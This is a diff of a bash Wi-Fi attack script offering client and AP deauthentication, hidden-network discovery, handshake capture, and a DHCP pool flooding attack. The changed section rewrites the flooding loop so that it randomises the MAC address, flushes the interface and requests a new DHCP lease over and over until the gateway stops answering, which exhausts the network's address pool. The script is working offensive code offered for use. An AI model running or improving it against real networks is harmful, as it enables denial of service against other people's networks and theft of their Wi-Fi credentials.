@@ -7,9 +7,9 @@
 chan=0
 if [ ! -d '/etc/apt' ]
 	then
-		echo "WARNING:You appear to not be using a debianesque System! Please review the script to change the needed bits."
+		echo "WARNING:You appear to not be using a debianesque System! Please review the script to change the needed bits." && sleep 20
 fi
-echo "checking for dependencies.."
+echo "checking for dependencies.. please wait"
 if [ ! -f '/usr/bin/aircrack-ng' ]
 	then
 		echo "loading aircrack.."
@@ -25,7 +25,7 @@ if [ ! -f '/sbin/iwlist' ]
 		echo "loading net-tools.."
 		sudo apt install net-tools -y > /dev/null
 fi
-if [ ! -f '/bin/macchanger' ]
+if [ ! -d '/etc/macchanger' ]
 	then
 		echo "loading macchanger.."
 		sudo apt install macchanger -y > /dev/null
@@ -50,9 +50,10 @@ echo "								                                        "
 tput sgr0
 #artwork end
 #opt
-echo "Choose an attack option:	[single client(1) whole AP(2) find hidden(3) get handshakes(4)	]"
-echo "							[DHCP pool attack (5)											]"
-read ask
+echo "     		 	Choose an attack option:							"
+echo "[single client(1) whole AP(2) find hidden(3) get handshakes(4)	]"
+echo "[DHCP pool flooding attack (5)					]"
+echo "Choose [1-5]:" && read ask
 if [ $ask -gt 5 ] || [ $ask -lt 1 ]
 	then
 		tput setaf 1
@@ -65,8 +66,11 @@ fi
 iwconfig
 echo "Interface name(e.g. wlan0):"
 read inter
-echo "Interface name in Monitor Mode?:"
-read monitor
+if [ $ask -st 5 ]
+	then
+		echo "Interface name in Monitor Mode?:"
+		read monitor
+fi
 clear
 #read interface end
 #main
@@ -170,45 +174,35 @@ if [ $ask -eq 5 ]
 		pass=0
 		essid=0
 		online=1
-		echo "To successfully perform this attack you must be able to login to the destination AP!"
+		echo "To successfully perform this attack you must be connected to the destination AP!"
+		echo "Your Hostname is:"
+		hostname
+		echo "..you should always be carefull.."
 		echo "	"
-		echo "scanning.." && sudo iwlist $inter scan | egrep 'Address|ESSID|Quality'
-		echo "choose AP ESSID:" && read essid
-		echo "Password:" && read -s pass
-		iwconfig
-		echo "Interface to use:" && read inter
-		if [ $essid = 0 ]
-			then
-				echo "This field can not be empty"
-				exit 1
-		fi
-		if [ $pass -eq 0 ]
-			then
-				iwconfig $inter $essid
-			else
-				iwconfig $inter $essid s:$pass
-		fi
-		dhclient $inter
-		sleep 1
+		tput setaf 1
 		gate=$(/sbin/ip route | awk '/default/ { print $3 }')
 		#start dhcp pool flooding
 		while [ $online -eq 1 ]
 			do
-				sudo /etc/init.d/networking restart > /dev/null
+				echo "attack is running, this will take a while.."
+				sudo ifconfig $inter down && sleep 2
+				sudo ip addr flush dev $inter
+				sudo macchanger -a $inter
+				sudo ifconfig $inter up 
+				sleep 4
+				sudo dhclient $inter
 				sleep 2
-				if [ $pass -eq 0 ]
-					then
-						iwconfig $inter $essid
-					else
-						iwconfig $inter $essid s:$pass
-				fi
-				macchanger -a > /dev/null
-				sleep 3
-				dhclient $inter
 				#check online start 
-				
+				ping $gate -c 1 > /dev/null
+				if [ $? -eq 1 ]
+					then
+						online=0
+				fi
 				#check online end
 		done
-		#end dhcp pool flooding 
-		
+		#end dhcp pool flooding
+		echo "	"
+		echo "The connection is interrupted!"
+		echo "You may be out of reach or DHCP pool has been successfully flooded" 
+		tput sgr0
 fi
